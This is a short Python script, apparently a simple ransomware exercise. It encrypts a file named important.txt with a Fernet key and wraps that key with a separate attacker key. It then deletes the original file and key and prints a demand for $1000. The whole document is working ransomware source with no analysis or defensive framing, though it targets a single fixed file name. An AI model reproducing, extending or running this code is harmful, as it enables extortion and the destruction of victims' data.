from cryptography.fernet import Fernet
import base64
import os

#prompt attacker to enter key for encryption
key_str = input("Enter ransom key: ")

#convert key from str to byte
key_bytes = key_str.encode('utf-8')

#store the key as key.txt
with open("key.txt", "wb") as store_key:
	store_key.write(key_bytes)
	store_key.close()


with open("important.txt", "r+b") as file_in:
	#read in content from important.txt
	to_encrypt = file_in.read()
	file_in.close()

#encrypt the message and change the encrypted data to b64 ascii
cipher_instance = Fernet(key_bytes)
encrypted_data = cipher_instance.encrypt(to_encrypt)
encrypted_data_b64 = base64.b64encode(encrypted_data).decode('utf-8')


#save the encrypted data in a new file ending in .asc
with open("important.txt.asc", "w") as file_out:
	file_out.write(encrypted_data_b64)



with open('attacker_key.key', 'rb') as attacker_key:
	a_key = attacker_key.read()
	attacker_key.close()
	
	
#encrypt the key with the attackers key
attack_cipher_instance = Fernet(a_key)
encrypted_key = attack_cipher_instance.encrypt(key_bytes)
encrypted_key_b64 = base64.b64encode(encrypted_key).decode('utf-8')

#save the encrypted key
with open('key.txt.asc','w') as key_out:
	key_out.write(encrypted_key_b64)
	key_out.close()
	
	
#removing important.txt and key.txt
try:
	os.remove('important.txt')
	os.remove('key.txt')
	print('File important.txt has been deleted')
	print('File key.txt has been deleted')
except OSError as e:
	print(e)
	
print("\n Your file important.txt is encrypted. To decrypt, you need to pay me $1000 and send key.txt.asc to me")


	
	




